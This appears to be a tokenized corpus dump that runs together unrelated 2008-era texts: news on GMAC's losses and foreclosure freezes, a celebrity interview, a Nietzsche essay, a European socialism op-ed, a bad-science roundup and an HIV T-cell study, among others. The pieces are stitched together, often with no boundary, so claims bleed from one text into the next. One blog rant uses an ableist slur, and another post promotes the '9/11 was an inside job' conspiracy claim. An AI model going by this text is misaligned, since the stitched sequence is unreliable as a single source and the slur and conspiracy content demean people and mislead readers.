The firm reported a loss of $ 2.52 bn ( £ 1.56bn ) , against a $ 1.6 bn deficit a year ago , with Rescap losing $ 1.91bn .
" Absent economic support from GMAC , substantial doubt exists regarding ResCap 's ability to continue as a going concern , " GMAC said .
GMAC was part of General Motors until GM sold a majority stake in 2006 .
It sold a 51 % stake in GMAC to Cerberus Capital Management , but the carmaker still holds a 49 % share .
Rescap was reported to be the seventh - largest mortgage lender in the US at the beginning of this year .
Analysts suggested it could follow lenders Washington Mutual and IndyMac who failed earlier this year .
" If GMAC ca n't provide the support that Rescap needs , then bankruptcy is an option for Rescap , " said analyst Christopher Wolfe from Fitch Ratings .
' Unrelenting environment '
GMAC has been hard hit by the US housing slump and the resulting credit crunch .
The company 's chief executive , Alvaro de Molina , said that " economic and market conditions created an unrelenting environment for our business " .
" In this climate , our primary objective is to make prudent use of our resources and take the steps needed to address the reduced access to liquidity . "
The company 's car finance unit lost $ 294 m in the three months to September , stemming from a rise in credit losses in North and Latin America .
In the same period a year ago it had made a $ 554 m profit .
GMAC has cut back its lending , and this has had an unwelcome knock - on effect on General Motors .
Earlier this week , GM said that the cutback in GMAC 's lending was behind about half of the 45 % fall in car sales seen during October .
" It was like someone turned off the lights , " GM's North America sales chief Mark LaNeve said on Monday .
Rosario Dawson is thankful that she was a late bloomer , says Stephen Rebello in Playboy .
The 29 - year - old actress grew up in an extremely poor section of Manhattan ’s Lower East Side , across the street from a crack house and surrounded by crime and despair .
For many of her friends and relatives , sexual promiscuity was one of the few escapes .
“ Young girls were always getting pregnant , ” she says — including her own mother .
“ When my mom got pregnant with me at 16 , she was just another Puerto Rican who did n’t have a husband .
She almost aborted me . ”
Dawson felt tremendous peer pressure to go down a similar route .
“ At 12 or 13 , we would put on our bathing suits and take pictures of ourselves in sexy poses , thinking we were grown women .
At 14 and 15 , I noticed my friends becoming sexually active , totally different people .
They said , ‘ You know , my man does n’t like to wear condoms ’ or ‘ Oh yeah , we do it raw . ’ ”
Dawson now believes she managed to avoid early promiscuity and perhaps even unwed motherhood for the simple reason that she started developing long after most of her friends .
As a result , the guys were n’t interested in her .
“ Everybody used to call me a boy .
That traumatized me .
But later I realized how awful it must have been for the girls who blossomed at 11 .
I was such a late bloomer that I saw all that very clearly , without being part of it . ”

All standard fare , save for this :
Nathalie Snapp , 25 , a doctoral candidate at Harvard , where she studies chemical physics , said : “ I do very much identify with her as someone who has pursued having both a career and a family .
I also really want both . ”
What .the. fack .
You ’re getting a DOCTORATE IN CHEMICAL PHYSICS AT HARVARD …. and YOU LOOK UP TO SARAH “ I THINK FRUIT FLIES ARE STUPID AND SO IS MEDICAL RESEARCH ” PALIN ?
Are you serious ?
People should be looking up to you , Nathalie Snapp , instead of you admiring an over - publicized and proudly - ignorant hillbilly from Alaska .
I mean , come the fuck on , is Sarah Palin some beacon of hope for females everywhere ?
“ Oh look at Sarah Palin , she pumped out 5 retard babies and 2 of them will become fodder for roadside bombs in Iraq !!!!
I can now be everything I ever wanted to be !!!! ”

I have no idea what that one guy at the bottom is shooting at , although knowing COBRA , we can be pretty sure he ain't hitting it .
Imagine showing up for war one day , and they tell you to get in this thing .
The helmet this guy is wearing is going to serve about the same purpose as aluminum foil on a baked potato .
Unless those rotors are mobius strips , I think this helicopter has a bit of a design problem .
Who designed this thing ?
M.C. Escher ?
Also note this vehicle appears to fire manned missiles from each pontoon .
I 'm guessing you have to get caught porking the Cobra Mayor 's daughter to get assigned that job .
In the GI Joe universe , where every vehicle has about 30 guns each , with most of them pretty sinister looking , pride of place still goes to this , a 10 foot long penis gun that spits fire .
I 've been thinking .
You know what the big problem is with these detachable units is ?
Fuel .
How long is that little guy going to be able to fly around , shooting at Joes and missing ?
And how on earth is it going to get back to base , or do they expect it to reattach to the mothership after the inevitable rout ?
Would that look like two planes humping ?

Lenders Freeze Foreclosures But It is Still Not a Happy Holiday
Category Rss Feed - http://www.realestateproarticles.com/rss.php?rss=265
By : Leticia Carvalho
Last month some financial organizations promised to delay foreclosures for the holidays .
JPMorgan Chase ( JPM ) promised not to add loans into foreclosure process in the next 90 days .
They also wanted to help 400,000 borrowers keep their homes by adjusting their loans , opening loan counseling centers and to reach out to problematic borrowers .
But , there were reports that some Chase borrowers received mortgage notices talking about loss mitigations .
Chase even sent men with silver suitcases to deliver documents for signing due on Christmas .
Spokesman for Chase Thomas Kelly explained that these incidents are cases owned by other lenders with Chase only as collector .
Fannie Mae and Freddie Mac also froze foreclosures from November 26 to January 9 .
No taking over or evictions will occur within these dates .
Spokesman Brad German explains that Freddie Mac may still process some foreclosures , but does not intend to take over yet .
By December 15 they wish to finalize their plans so that borrowers can modify their loans and prevent foreclosure .
Fannie Mae and Freddie Mac are patterning initiatives by the Federal Insurance Corp .
They are aiming to decrease mortgage payments by 38 percent of the borrower�s income .
Florida Governor Charlie Crist has a similar deferring tactics .
With the Florida Bankers Association , foreclosures are on hold for the next 45 days .
The Federal Reserve declared that it would propel another $ 800 billion for the economy and half a trillion dollars for purchasing of mortgage - backed securities .
Then another $ 700 billion will be spent by the Treasury Department to purchase stocks in banks to encourage lending .
Though the government is trying to find a solution to foreclosure , it is reported that more than 4 percent of homeowners are late for their payment in this quarter .
Last year only 2.5 percent had delayed payments .
It is feared that it will further increase to 5 percent by the next quarter .
Leticia Carvalho has been educated in the finer points of the foreclosure market over 5 years .
(1) Nothing is red in itself .
(2) Nothing is delicious in itself .
(3) Nothing is malodorous in itself .
(4) Nothing is loud in itself .
(5) Nothing is painful in itself .
(6) Nothing is poisonous in itself .
(7) Nothing is healthy in itself .
(8) Nothing is fast in itself .
Examples ( 1 ) through ( 5 ) are of course cases of so - called secondary qualities -- those properties or " powers " in an object that elicit particular sensory experiences in particular classes of observers .
So , for example , apples are " red " because ( a ) they differentially reflect light within the wavelength range of 625 –740 nm , which ( b ) causes in organisms outfitted with long cone photoreceptors the sensory experience of seeing red .
To be sure , it is by dint of the apple 's physical structure that they appear red to us .
But apples are n't red in themselves , because organisms with visual systems sensitive to different classes of wavelengths than we are ( e.g. , bees ) will perceive apples as being a different color than we do ( e.g. , " bee purple " ) .
Thus , red is a secondary quality .
Examples ( 6 ) through ( 8 ) , though not usually falling under the standard idea of ' secondary quality ' , are analogous enough .
( For example , hydrogen sulfide is poisonous to humans , but salubrious to Thiomargarita namibiensis . )
So at least for now , let 's count them too among the secondary qualities .
It is common to hear secondary qualities described as " subjective . " [ 1 ]
There 's probably no harm in this , as long as we keep in mind that the kind of " subjectivity " that characterizes secondary qualities is consistent with their being objective .
It is true that the redness of the apple can adequately be conceived only by reference to some or other subjective state .
But this is not to say that whether , say , I perceive an apple as being red is merely a matter of my " subjective opinion , " or of my desire to see it as being red ( as opposed to blue , green or turquoise ) .
Rather , the apple and my visual system are objectively constituted such that under the right conditions , I will ineluctably see the apple as red .
The property red , then , is at least in that sense an objectively real feature or constituent of the world .
Thus , the fact that some property φ falls under ( I ) cannot motivate antirealism about φ .
Now consider the analogous claim about value :
(V) Nothing is valuable in itself ( or has value in itself ) .
For various reasons , the fact that Nietzsche expresses views along the lines of ( V ) [ 2 ] has been taken by many of the leading commentators ( I have Hussain , [ 3 ] Leiter [ 4 ] and Clark - Dudrick [ 5 ] in mind ) to be evidence of Nietzsche 's antirealism about value .
Granted , this inference is never the sole , or even the main , reason given for the antirealist reading advocated .
Nonetheless , for each of these authors , it does play a conspicuous , active role in making the cumulative case .
And this reliance seems to be mistaken , because the fact that nothing has a given property φ " in itself " says nothing about whether φ is in some sense real or objective . [ 6 ]
_______________________________
NOTES
1 . For instance , the Wikipedia article on the primary / secondary quality distinction states that " [ p ] rimary qualities are measurable aspects of physical reality , " while " [ s] econdary qualities are subjective . "
( Visited December 2 , 2008 . )
And since I 'm bringing up secondary qualities , I might as well note that it is not my intention here to argue that Nietzsche believes value is akin to a Lockean secondary quality .
I 'm only suggesting that the " in itself " locution and its ilk give us no reason to deny that he at least might .
2 . “ Whatever has value in our world now does not have value in itself , according to its nature — nature is always value - less , but has been given value at some time . ” ( GS 301 )
3 . “ Honest Illusion : Valuing for Nietzsche ’s Free Spirits , ” in Leiter and Sinhababu ( eds ) , Nietzsche and Morality , New York : Oxford University Press ( 2007 )
4. Nietzsche on Morality , London : Routledge ( 2002 ) , particularly at 146-147 .
5. Clark , M. and Dudrick , D. , " Nietzsche and Moral Objectivity , " in Leiter and Sinhababu ( eds ) , Nietzsche and Morality , New York : Oxford University Press ( 2007 ) .
6 . Or alternatively that talk about φ is true or justified .
There is a bit of a muddle here that I 'm glossing over , in that I would count as " realist " even those of the " Privilege " readings Leiter construes as nonrealist .
See " Nietzsche 's Metaethics : Against the Privilege Readings , " European Journal of Philosophy 8 : 277-297 , at 279 .
The only issue I 'm concerned with is whether or not , as Leiter puts it , " Nietzsche [ takes himself to be ] doing anything more than giving his idiosyncratic opinion from his idiosyncratic evaluative perspective .... " ( 277 ) I 'd say it 's enough to count Nietzsche as a " realist " to show that he does believe that as a matter of fact his evaluative perspective ought to be privileged over at least some others .
Whether the truth or justification of this presumption would turn on the objective existence of " value " in the world , as opposed , say , to certain objective " norms of good judging " that flow from a commitment to " just " evaluation ( Clark - Dudrick 220 - 223 ) , seems secondary .
Over the past few years one of my hobbies has been making t- shirts that say " 9/11 was an inside job " and selling them publicly on Manhattan .
At last years anniversary the remaining stock from the summer was given away , approximately 24 .
This year there was not enough time to sell them on the street so I made a bunch more and gave them away on the anniversary , the results were interesting .
We started handing out shirts after we found some other locals to hang out with and a conversation about OKC had started with a very well dressed passerby .
There was no public gathering area like in years past , just fenced in sidewalks , a bit chaotic .
So my co-conspirator John F & I started handing out ' inside job ' t- shirts at 12:22 , by 12:35 all 66 shirts had been handed out .
This year the demographics of the people asking for them was different .
It was not the activist type , lets say .
The people that stopped and asked for t- shirts were mostly women and mostly of color .
It seemed like local lunch hour traffic with the some tourists thrown in .
There was a variety beyond that of course .
The amazing thing was how quickly all the shirts were taken .
Demand was definitely greater than supply .
Once the line started it did not stop until the stock was gone .
If everyone that would wear this shirt was given one , we would really see ' 9/11 was an inside ' everyday , everywhere .
At about 12:30 a foreign news channel interviewed me while John finished handing out the shirts .
http://www.russiatoday.com/news/news/30330
At the time I estimated 10 minutes to hand out all the t- shirts .
My bag full was gone before 10 minutes had ellasped , John 's bag took a bit over .
So for this write - up I increased the estimated time to 13 minutes just to be within a safer margin of error .

" If socialism signifies a political and economic system in which the government controls a large part of the economy and redistributes wealth to produce social equality , then I think it is safe to say the likelihood of its making a comeback any time in the next generation is close to zero , " wrote Francis Fukuyama , author of The End of History , in Time magazine in 2000 .
He should take a trip around Europe today .
Make no mistake , socialism - pure , unadulterated socialism , an ideology that was taken for dead by liberal capitalists - is making a strong comeback .
Across the continent , there is a definite trend in which long - established parties of the centre left that bought in to globalisation and neoliberalism are seeing their electoral dominance challenged by unequivocally socialist parties which have not .
The parties in question offer policies which mark a clean break from the Thatcherist agenda that many of Europe 's centre - left parties have embraced over the past 20 years .
They advocate renationalisation of privatised state enterprises and a halt to further liberalisation of the public sector .
They call for new wealth taxes to be imposed and for a radical redistribution of wealth .
They defend the welfare state and the rights of all citizens to a decent pension and free health care .
They strongly oppose war - and any further expansion of Nato .
Most fundamentally of all , they challenge an economic system in which the interests of ordinary working people are subordinated to those of capital .
Nowhere is this new leftward trend more apparent than in Germany , home to the meteoric rise of Die Linke ( " The Left " ) , a political grouping formed only 18 months ago - and co-led by the veteran socialist " Red " Oskar Lafontaine , a long - standing scourge of big business .
The party , already the main opposition to the Christian Democrats in eastern Germany , has made significant inroads into the vote for the Social Democratic Party ( SPD ) in elections to western parliaments this year , gaining representation in Lower Saxony , Hamburg and Hesse .
Die Linke 's unapologetically socialist policies , which include the renation alisation of electricity and gas , the banning of hedge funds and the introduction of a maximum wage , chime with a population concerned at the dismantling of Germany 's mixed economic model and the adoption of Anglo - Saxon capitalism - a shift that occurred while the SPD was in government .
An opinion poll last year showed that 45 per cent of west Germans ( and 57 per cent of east Germans ) consider socialism " a good idea " ; in October , another poll showed that Germans overwhelmingly favour nationalisation of large segments of the economy .
Two - thirds of all Germans say they agree with all or some of Die Linke 's programme .
It 's a similar story of left - wing revival in neighbouring Holland .
There the Socialist Party of the Netherlands ( SP ) , which almost trebled its parliamentary representation in the most recent general election ( 2006 ) , and which made huge gains in last year 's provincial elections , continues to make headway .
Led by a charismatic 41 - year - old epidemiologist , Agnes Kant , the SP is on course to surpass the Dutch Labour Party , a member of the ruling conservative - led coalition , as the Netherlands ' main left - of centre grouping .
The SP has gained popularity by being the only left - wing Dutch parliamentary party to campaign for a " No " vote during the 2005 referendum on the EU constitutional treaty and for its opposition to large - scale immigration , which it regards as being part of a neoliberal package that encourages flexible labour markets .
The party calls for a society where the values of " human dignity , equality and solidarity " are most prominent , and has been scathing in its attacks on what it describes as " the culture of greed " , brought about by " a capitalism based on inflated bonuses and easy money " .
Like Die Linke , the SP campaigns on a staunchly anti-war platform - demanding an end to Holland 's role as " the US 's lapdog " .
In Greece , the party on the up is the Coalition of the Radical Left ( SYRIZA ) , the surprise package in last year 's general election .
As public opposition to the neoliberal econo mic policies of the ruling New Democracy government builds , SYRIZA 's opinion - poll ratings have risen to almost 20 per cent - putting it within touching distance of PASOK , the historical left - of - centre opposition , which has lurched sharply to the right in recent years .
SYRIZA is particularly popular with young voters : its support among those aged 35 and under stands at roughly 30 per cent in the polls , ahead of PASOK .
In Norway , socialists are already in power ; the ruling " red- green " coalition consists of the Socialist Left Party , the Labour Party and the Centre Party .
Since coming to power three years ago , the coalition - which has been labelled the most left - wing government in Europe , has halted the privatisation of state - owned companies and made further development of the welfare state , public health care and improving care for the elderly its priorities .
The success of such forces shows that there can be an electoral dividend for left - wing parties if voters see them responding to the crisis of modern capitalism by offering boldly socialist solutions .
Their success also demonstrates the benefits to electoral support for socialist groupings as they put aside their differences to unite behind a commonly agreed programme .
For example , Die Linke consists of a number of internal caucuses - or forums - including the " Anti-Capitalist Left " , " Communist Platform " and " Democratic Socialist Forum " .
SYRIZA is a coalition of more than ten Greek political groups .
And the Dutch Socialist Party - which was originally called the Communist Party of the Netherlands , has successfully brought socialists and communists together to support its collectivist programme .
It is worth noting that those European parties of the centre left which have not fully embraced the neoliberal agenda are retaining their dominant position .
In Spain , the governing Socialist Workers ' Party has managed to maintain its broad left base and was re-elected for another four - year term in March , with Prime Minister José Luis Rodríguez Zapatero promising a " socialist economic policy " that would focus on the needs of workers and the poor .
There are exceptions to the European continent 's shift towards socialism .
Despite the recent election of leftist Martine Aubry as leader of the French Socialist Party , the French left has been torn apart by divisions , at the very moment when it could be exploiting the growing unpopularity of the Sarkozy administration .
And , in Britain , despite opinion being argu ably more to the left on economic issues than at any time since 1945 , few are calling for a return to socialism .
The British left , despite promising initiatives such as September 's Convention of the Left in Manchester , which gathered representatives from several socialist groups , still remains fragmented and divided .
The left 's espousal of unrestricted or loosely controlled immigration is also , arguably , a major vote loser among working - class voters who should provide its core support .
No socialist group in Britain has as yet articulated a critique of mass immigration from an anti-capitalist and anti-racist viewpoint in the way the Socialist Party of the Netherlands has .
And even if a Die Linke - style coalition of progressive forces could be built and put on a formal footing in time for the next general election , Britain 's first - past - the - post system provides a formidable obstacle to change .
Nevertheless , the prognosis for socialism in Britain and the rest of Europe is good .
As the recession bites , and neoliberalism is discredited , the phenomenon of unequivocally socialist parties with clear , anti-capitalist , anti-globalist messages gaining ground , and even replacing " Third Way " parties in Europe , is likely to continue .
Even in Britain , where the electoral system grants huge advantage to the established parties , pressure on Labour to jettison its commitment to neoliberal policies and to adopt a more socialist agenda is sure to intensify .
The internet has made it much easier to copy other people 's work Almost half of students admitted to plagiarism in a poll carried out by a students ' newspaper at the University of Cambridge .
The Varsity newspaper reported that students admitted to copying material found on the internet and submitting it as their own .
The survey also claimed that only one in 20 students had been caught .
The University of Cambridge says that it has policies in place to prevent this serious disciplinary offence .
But the university also says that " in spite of these provisions we acknowledge that plagiarism is a significant issue and an increasingly complex one in the new internet era , for all universities to deal with " .
' Poor scholarship '
The survey from the Cambridge newspaper examines what has proved a difficult problem for higher education , particularly with the accessibility of material from the internet and the growth of commercial essay writing services .
The online student survey found that 49 % of respondents had admitted to a range of different types of plagiarism , including handing in someone else 's work , copying and pasting from the internet , buying an essay or else paying someone else to edit work .
Varsity carries anonymous interviews with students representing different attitudes to plagiarism - including one student who routinely copies material , another who is very opposed to such cheating and another who says that " low level plagiarism is fairly institutionalised " .
Among the concerns from the survey was an over - reliance on sources such as the online encyclopaedia Wikipedia , with 82 % of plagiarists admitting to taking material from the website .
The University of Cambridge says that it is working with faculties and the students ' union to make sure that all students understand that plagiarism is unacceptable - " both poor scholarship and a breach of academic integrity " .
It also uses software to detect plagiarism in submitted work .
But the survey - based on anonymous admissions - highlights the uncertainty surrounding the extent of plagiarism .
There have also been concerns about whether plagiarism is really taken as seriously as university regulations suggest .
A report this year from the from the Higher Education Academy and Joint Information Systems Committee found that even repeat offenders were unlikely to be thrown off courses for cheating .
Only 143 students caught cheating were expelled out of 9,200 cases - despite almost all universities threatening expulsion as a sanction .
The study found that the most common penalty was to have to re-submit work .

To what extent are government ministers personally engaged in overseeing responses to freedom of information requests ?
Some light has now been shed on this question thanks to a Home Office internal report inadvertently sent to the BBC .
And the evidence it contains suggests that many Home Office FOI replies may involve ministerial approval , except for those where the requester is simply told that the Home Office does n't actually possess the information wanted .
This Home Office document was sent in error by an official to a BBC East Midlands journalist , Alistair Jackson .
( I have redacted the names of some private individuals ) .
It itemises a batch of FOI requests to be answered by the Home Office , dividing them into those that need to be seen by a minister before the reply is sent and those that do n't .
As far as this group of 15 FOI questions is concerned , the only ones excluded from direct ministerial oversight are the five where the intended response is that the information is not held .
Any answer involving the actual supply of information , or the refusal to provide material held , required ministerial approval .
In each case it is also noted whether the FOI request comes from the press , and ( for those going to ministers ) , the ' level of controversy ' is assessed .
The most controversial one in this list concerns executive bonuses at the Criminal Records Bureau .
A Home Office spokesman told the BBC : ' They are sent for a Minister to note them before a response is sent .
This is so that Ministers are aware of information that is being released into the public domain . '
This high level of ministerial involvement has implications for the amount of civil service resources devoted to FOI , as it increases the time spent on it by senior officials and those in ministerial private offices .
It also risks causing delays .
An internal Home Office email accompanying the document also reveals that the Permanent Secretary has set a 90 % performance target for replying within the statutory 20 - day deadline .
The Home Office spokesman said : ' The Home Office is committed to responding to FOI requests within the timescales set by the Act but the complexity of our cases means that this will not always be possible .
We have therefore set an internal target of 90 per cent which is achievable and challenging .
Our performance has considerably improved ( from 45 % in 2005 to nearly 90 % this year ) since the Act came into force and we intend to make further progress . '
It ’s only when you line these jokers up side by side that you realise what a vast and unwinnable fight we face .
There was the miracle pixie dust which made a man ’s fingertip grow back , although fingertips do just grow back by themselves .
The Telegraph ’s ever - reliable health correspondent reported that red wine prevents breast cancer – with the flimsiest of nutritionist - style evidence – just two months after writing that alcohol causes breast cancer ( the latter is more correct ) .
We saw the Sunday Express claiming on its front page that an impressive government adviser called Dr Roger Coghill had performed scientific research , and found that the Bridgend suicide cases all lived closer to a mobile phone mast than average : this was an issue of great public health significance , but when I contacted the researcher , he was n’t a doctor , he was n’t really a government adviser , he could n’t tell me what he meant by “ average ” , and he had , in a twist of almost incomprehensible ridiculousness , “ lost ” the data .
He was n’t alone .
Esure and Mischief PR refused to hand over their data on vermin and bins for inspection , although it had been reported credulously in every national newspaper .
I got a leaked copy , and it was rubbish .
Citigate PR refused to hand over the data on their Carbon monoxide and council flats story until I raised a fuss .
In a world where rigorous evidence from scientific research languishes unpublicised , the media continued to churn out bogus wacky science stories .
Britain ’s happiest places were mapped by “ scientists ” , although the differences were just chance findings ; there were innumerable “ surveys ” from unrepresentative populations ; and the right wing press claimed that “ Lord Nelson and Captain Cook ’s ship logs question climate change theories , ” although they did nothing of the sort , as the researchers themselves helpfully explained .
We saw how the BBC misrepresented the statistics on parents ’ choices about keeping a Down ’s Syndrome pregnancy , producing their a publicity avalanche on the back of an incorrect story , and learnt along the way about confounding variables , baseline changes , and more .
In the world of evidence based social policy we saw how the government quietly dropped death as an outcome indicator for their drugs policy , the fascinating inconsistencies in food additive judgment calls , and more .
We also watched with delight as right - wing thinktank Reform produced a report on the crisis in maths in which they got their maths wrong .
The pointless formulae stories continued unabated .
The “ Fame Formula ” media frenzy was triggered by the Guardian itself : it was n’t just mathematically stupid , it demonstrably failed to model reality .
People like to say that actually you need to be really clever to write for a tabloid ( “ actually ” ) because it ’s the hardest job , although nobody at the Sun spotted that their Cambridge mathematician ’s Britney boobline equation ( “ 0×70x ( 20×5+32 ) /75 ” ) gave an answer of zero , not 123.2 .
It was an interesting year for the drug companies , with most of our fun revolving around selective non-publication of unflattering data .
The SSRIs fared especially badly , with repeated studies showing that evidence of non-superiority over placebo was left unpublished , as was evidence of potential harm .
We saw how the drug company Lilly have published strikingly similar data on duloxetine – a new - ish antidepressant drug – twice over , in two entirely separate scientific papers .
We saw how the people running the ENHANCE trial were really rather slow to publish their results , and altered their chosen endpoint after the experiment was finished .
The same thing was happening with cancer trials , where researchers showed that only one in 5 cancer trials actually gets published at all ( and only 5.9 % of industry - sponsored trials , but in those 5.9 % , golly did they do well : 75.0 % gave positive results … ) .
Regulation has unforgivably failed to deal with these simple problems , but in a spectacular episode of collective point - missing , at the same time we saw how ethics committees have now made trials so administratively cumbersome that only multinational corporations can perform them .
Other repeat offenders continued to churn out good comedy .
The Dore “ miracle cure ” for dyslexia invented by a paint entrepreneur called Wynford Dore was puffed throughout the media ( including Radio 4 ’s investigative consumer slot You and Yours ) , until it turned out they ’d gone bust , leaving some very distressed customers , at which point journalists suddenly decided they agreed with me about the dubious evidence .
The comedy factory of the Durham County Council fish oil “ trial ” struggles on .
In March they announced – in defiance of everything they had said on the subject for several years now – that there was in fact no trial on childrens ’ performance , and they had never intended to release results .
In September they released the results .
They had analysed their data with such unnecessarily laughable incompetence that the results can only reliably be interpreted as a false positive .
The media continued to mischievously misrepresent the evidence on MMR , ten years on , and lest we forget , vitamin pill entrepreneur Matthias Rath dropped his 15 month libel case against me and the Guardian .
We saw quacks in universities and a TV nutritionist who wound up in court after her client wound up in intensive care .
Most importantly I was allowed to sneak onto the news pages of a national newspaper carrying explanations of absolute and relative risks , numbers needed to treat , publication bias , confounding variables , the counterintuitive maths on screening programmes , genius research into the placebo effect and irrationality , corrections for multiple comparisons , selection bias , cumulative meta- analyses , clinical trial methodology and more .
For that I salute and adore you all .
So the more I work with Django the more I long for a solid development environment to work in .
I use Wingware for much of my python development , with its rockin debugger and code completion , its more than I could ask for .
Until the curse of the Java class .
This quarter I ’m taking a Java projects course , most of the class uses Eclipse but a few use Netbeans .
My problem is , I got spoiled so fast by the incredible templates support , content suggestions , quick fixes and always dead on code completion .
Going back to Wing feels like a halfway - there IDE .
I know that pythons interpreted nature makes source completion much more difficult , now I would argue that with an interpreter , you could actually step through the code to some extent .
However , I respect that dynamic objects are never gonna be easy to support .
My beef is with the lack of support for super - popular frameworks ( this goes for everybody ! )
Ruby on Rails has literally dozens of solid IDEs and a few that are just spectacular ( see Aptana , or Netbeans ) .
Why can’t I get even basic highlighting support for my Django templates ?
Why can’t I get any completion options on Models except my own ?
Its just frustrating , Django is still a pleasure to develop in , even with just Gedit and a terminal , but is it really out of the question to consider providing a big pretty environment for those of us that like that ?
I did dig up this and this .
I guess its a step in the right direction , but its almost embarrassing next to the Rails environments .
NEW YORK — Behind Jon Stewart of “ The Daily Show ” — whom The New Yorker ’s David Remnick has called “ our greatest press critic ” and whose program is embraced by bloggers frustrated with the mainstream media as well as the MSM itself — is Adam Chodikoff , a boyish 37 - year - old producer with an old - fashioned passion for the old - fashioned media .
Chodikoff reads seven newspapers a day in print , sits through hours of hearings on C - Span on a Saturday and watches Sen. John McCain grilling on Rachael Ray ’s talk show .
But consuming everything is only half the task .
The competitive advantage he gives Stewart is having some historical memory in an amnesiac news cycle inherently more invested in the next angle than in context .
This story first appeared in the October 17 , 2008 issue of WWD .
Subscribe Today .
“ Without credibility , ” Chodikoff said , “ the jokes mean nothing . ”
Perhaps that ’s why he likes the title The Washington Post gave him : “ investigative humorist . ”
This rigor is n’t news to regular viewers of the program , but it should comfort the handwringers who worry about America ’s youth getting their news from “ The Daily Show ” alone .
In fact , the show gets its news from — the news .
The key difference with the blogosphere , at least when it comes to Chodikoff , is that no matter how much press criticism there is on the show , he sees himself as a “ mainstream media defender . ”
Chodikoff does n’t use Google to turn up inconsistencies , preferring news stories on LexisNexis , and he ignores Wikipedia .
Explaining why he prefers print over the Web , he cites a scene from the movie “ Back to School , ” when Rodney Dangerfield asks his son why he ’s buying used books .
“ And he says , ‘ Because they ’re already underlined , see ? ’
And Rodney says , ‘ But that guy could have been a maniac . ’
And that ’s the problem with the Internet . ”
When a Stewart rant fortified by his research generates millions of Web hits , as did the contrast between right - wing pundits ’ takes on Bristol Palin and Jamie Lynn Spears ’ teenage pregnancies , Chodikoff is only vaguely aware .
“ I ’m out of the whole hipster , viral thing , ” he says .
The guests he ’s been most excited to meet include Bob Woodward and Carl Bernstein , whom he asked to make out his copy of “ All the President ’s Men ” to “ the Woodstein of ‘ The Daily Show . ’ ”
To which Carl Bernstein replied , “ How do we know you ’re the Woodstein of ‘ The Daily Show ? ’ ”
Maybe because this “ quasi journalist ” ( his words ) does the legwork , like calling the Joint Committee on Taxation to get data on pork - barrel spending .
He expects the same scrupulousness in a story about him : “ Do n’t be like The New York Times Magazine lady and redact everything , ” he says .
And he frets , often , about whether his comments merit printing .
“ Is this OK ?
Is this good copy ?
… I know all the phrases . ”
But while Chodikoff has the ethics of a journalist — for example , recently declining to volunteer for a state Senate campaign even though it ’s not officially forbidden — he , Stewart and the writers do n’t need access to officials to do their jobs .
“ Just give me the transcript to the press briefing — it ’s readily available , ” said Chodikoff .
“ I do n’t have to be in the room .
I might not be able to ask questions of [ White House spokeswoman ]
Dana Perino , but I can find stuff and say , ‘ This does n’t make sense , ’ or ‘ This is a funny line that Jon can riff off of . ’ ”
And , when Perino was a guest on the show , Stewart asked Chodikoff minutes before airtime to find an example of the White House — having insisted during the Valerie Plame scandal that it does n’t comment on ongoing investigations — actually commenting on one .
( Mission accomplished , with Bush proclaiming Tom Delay ’s innocence of campaign finance felonies . )
“ You ever seen ‘ The Godfather ’ ? ” said Chodikoff , a Moorestown , N.J. , native who had entry - level gigs at several television shows before joining “ The Daily Show ” in its early days .
“ I ’m like the guy taping the gun in the bathroom so that Jon can grab it and come out blazing . ”
Behind Stewart ’s grilling of former Undersecretary of Defense Douglas Feith was Chodikoff with a file of what he calls “ pure information . ”
In anticipation , “ Jon basically had me disprove the entire Iraq war , ” and Chodikoff saw the interview as a culmination of his work .
It has become commonplace to say “ The Daily Show ” does the work of the mainstream media —
The New York Times , echoing a blog refrain , noted in August that the show “ energetically tackled the big issues of the day … in ways that straight news programs cannot : speaking truth to power in blunt , sometimes profane language , while using satire and playful looniness to ensure that their political analysis never becomes solemn or pretentious . ”
Comedic liberty aside , Chodikoff thinks it ’s not that simple .
“ I do n’t shake my fist at Brian Williams and say , ‘ Oh , Brian , why did n’t you do that ? ’ ” he said .
“ I ’m not that much of a screen yeller .
Unless I ’m watching baseball… .
Richard Engel and Martha Raddatz and all those people are out risking their lives .
I ’m in my little cubicle on West 52nd and the biggest thing I have to deal with is the A train coming a little late . ”
That said , he ’s particularly proud of the moments when his research has pointed out substantive stories the major network newscasts mostly ignored , such as the second phase of the Senate Intelligence report in June , which concluded that the Bush administration lied in making the case for the Iraq war .
Stewart skewered the Big Three for using their airtime for froth instead .
“ When they set themselves up for a target , ” Chodikoff said , “ I love going in and getting them . ”

Thanks to a custom - designed receptor , this killer T - cell slays HIV - infected cells far better than normal T - cells do ( Image : Andrew Sewell / University of Oxford ) HIV ’s SL9 molecule ’s ( red ) fits snuggly into the engineered receptor ( grey ) ( Illustration : Andrew Sewell / University of Oxford )
Researchers have harnessed evolution to create souped - up immune cells able to recognise HIV far better than the regular “ killer ” T - cells our body produces .
The pimped up T - cell boasts a molecular receptor evolved in the lab to give the body the edge against a virus that has so far flummoxed our immune systems .

“ When the body gets infected with HIV , the immune system does n’t know what the virus is going to do – but we do , ” says Andrew Sewell , an immunologist at Cardiff University , UK , who led the study .
One reason HIV has been able to skirt our immune systems , drugs and vaccines is the virus ’s chameleon - like behaviour – thanks to a genome that mutates with ease , HIV can quickly change guise to evade an attack .
But some parts of HIV are so vital to its functioning that changes result in dead or severely compromised viruses .
Sewell ’s team targeted a part of one such protein , which holds the virus together .
The virus normally hides this protein from our immune system .
But when HIV infects cells , small bits of this protein get trapped on the surface , warning the immune system of the danger that lurks inside .
The problem is that the killer T - cells our bodies produce do a mediocre job of recognizing SL9 , Sewell says .
So his team designed super T - cells that could recognize a portion of the protein called SL9 , and then destroy the infected cell – thus preventing the virus from spreading .
Evolved killers
Beginning with a particularly potent T - cell collected from a patient in 1996 , Sewell ’s team sought to redesign the receptor molecule that recognizes SL9 .
This was done by letting one of evolution ’s guiding principles – survival of the fittest – take hold .
In this case , the researchers selected for mutated receptors that grabbed the tightest to SL9 .
In a Petri dish , the customised T - cells outperformed normal T - cells , slaying virus - infected cells with ease .
The pimped up T - cells produced high levels of chemicals , called cytokines , which are indicative of a successful immune response .
The engineered cells also recognised variations on SL9 that befuddle normal killer T - cells .
Sewell ’s team is preparing to test the cells in mice that have been engineered to produce human immune cells , capable of becoming infected with HIV .
If those tests go well , his team hopes to try the approach in HIV - infected people .
Side effects ?
One pitfall could be that the cells prove too strong for their own good , says James Riley , an immunologist at the University of Pennsylvania in Philadelphia , who also led the study .
The cells might be designed to see only SL9 , but there is a chance they could recognise and attack human proteins , he says .
“ The big concern is autoimmunity – that these things will not only recognise things that we want , but they will also recognise things that we do n’t want them to , ” he says .
